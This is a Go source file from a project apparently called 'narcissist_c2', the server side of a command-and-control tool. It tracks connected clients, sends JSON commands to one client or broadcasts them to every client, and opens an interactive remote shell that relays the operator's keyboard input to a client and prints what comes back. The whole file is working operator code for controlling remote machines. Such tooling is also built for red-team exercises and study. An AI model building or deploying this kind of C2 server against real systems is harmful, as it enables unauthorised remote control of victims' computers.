package components

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"io"
	"narcissist_c2/server/structs"
	"narcissist_c2/server/utils"
	"net"
	"os"
	"sync"
	"time"
)

var Clients = make(map[int]structs.Client)
var clientCounter int
var mutex sync.Mutex
var DataCh = make(chan []byte)

func GetClients() map[int]structs.Client {
	return Clients
}

func GetClientCounter() int {
	return clientCounter
}

var IOStateCh structs.Channels

var Buf bytes.Buffer
var MultiReader io.Reader

func HandleClient(conn net.Conn, inputChannels structs.Channels) {
	tcpConn, ok := conn.(*net.TCPConn)
	if ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(30 * time.Second)

	}
	IOStateCh = inputChannels
	readBuf := make([]byte, 1024)

	mutex.Lock()
	clientCounter++
	clientID := clientCounter
	mutex.Unlock()

	client := structs.Client{
		clientID,
		conn.RemoteAddr().String(),
		conn,
	}

	defer CloseConn(client)

	mutex.Lock()
	Clients[clientID] = client
	mutex.Unlock()

	//mutex.Lock()
	RemotePrint(utils.GetEmoji("connection")+"New connection from %s\n", conn.RemoteAddr().String())
	//mutex.Unlock()

	for {
		n, err := conn.Read(readBuf)
		if err != nil {
			if err.Error() == "EOF" {
				return
			} else {
				fmt.Println(utils.GetEmoji("error") + "Error reading from " + conn.RemoteAddr().String())
				return
			}
		}
		mutex.Lock()
		Buf.Write(readBuf[:n])
		mutex.Unlock()
		//fmt.Println("WRITTING IN BUFFER ")
		data := make([]byte, n)
		copy(data, readBuf[:n])
		DataCh <- data
		//MultiReader = io.MultiReader(&Buf, conn)
		//fmt.Println("READER DONE ")

	}

}

func SendCommand(client structs.Client, command string) {

	_, err := client.Conn.Write([]byte("{\"type\": \"cmd\", \"args\": [\"" + command + "\"]}" + "\n"))
	if err != nil {
		RemotePrint(utils.GetEmoji("error")+"Erreur lors de l'envoi de la commande : %v\n", err)
		CloseConn(client)

		return
	}
	fmt.Println(utils.GetEmoji("send") + "Command sent ")

}

func SendBroadcast(clients map[int]structs.Client, command string) {
	fmt.Println(utils.GetEmoji("loading") + "Sending command")
	//RemotePrint()
	for _, client := range clients {
		SendCommand(client, command)
	}

}

func CloseConn(client structs.Client) {
	fmt.Print("\r")
	fmt.Printf(utils.GetEmoji("closed")+"Connection closed from %s\n", client.Conn.RemoteAddr().String())
	fmt.Print(GetStrIpt())
	delete(Clients, client.ID)
	client.Conn.Close()
}

func RemotePrint(str string, args ...interface{}) {
	fmt.Print("\r")
	fmt.Printf(str, args...)
	fmt.Print(GetStrIpt())
}

func ShellSession(client structs.Client, ctx context.Context, cancel context.CancelFunc, ch chan bool) {
	defer fmt.Println("FIN")
	fmt.Println("SHELL SESSION STARTEDDDDD")
	_, err := client.Conn.Write([]byte("{\"type\":\"shell_session\",\"args\":[\"true\"]}\n"))
	if err != nil {
		fmt.Printf(utils.GetEmoji("error")+"Error while starting shell session: %v\n", err)
		return // Sortir immédiatement si une erreur survient
	}

	// Lancer une goroutine pour lire la sortie du client
	go func() {
		fmt.Println("COPYING STDOUT GOROUTINE")
		_, err := io.Copy(os.Stdout, client.Conn)
		if err != nil {
			fmt.Printf(utils.GetEmoji("error")+"Error copying output from client: %v\n", err)
		}
	}()

	go func() {
		fmt.Println("CHECKING GOROUTINE")
		for {
			go fmt.Println(GetChValue(ch))
			select {
			case v := <-ch:
				if !v {
					fmt.Println("CHANNEL FALSE")
					cancel()
					return
				}
			case <-ctx.Done():
				return
			}
		}
	}()

	scanner := bufio.NewScanner(os.Stdin)

	for {
		fmt.Println("SCANNING INPUT")
		// Lire l'état d'IOState depuis le canal
		//state := <-IOStateCh.ClientIptCh

		// Si IOState est `false`, désactiver la session (quitter la fonction)
		//if !state {
		//	fmt.Println("Shell session deactivated")
		//	return
		//}

		// Lire les commandes tant que la session est active
		//fmt.Print("Enter command: ")
		select {
		case <-ctx.Done():
			fmt.Println("Context cancelled, exiting function")
			return
		default:

			if scanner.Scan() {
				command := scanner.Text()

				// Si la commande est "defocus", on quitte la session
				if command == "defocus" {
					fmt.Println("Shell session terminated by defocus command")
					//		IOStateCh.ClientIptCh <- false
					return
				}

				// Envoyer la commande au client
				command += "\n"
				_, err := client.Conn.Write([]byte(command))
				if err != nil {
					fmt.Printf("Erreur lors de l'envoi de la commande : %v\n", err)
					break // Sortir de la boucle si une erreur survient
				}
			} else {
				// Si la lecture échoue, on quitte la session
				fmt.Println("Scanner error or input closed, exiting shell session")
				return
			}
		}
	}
}
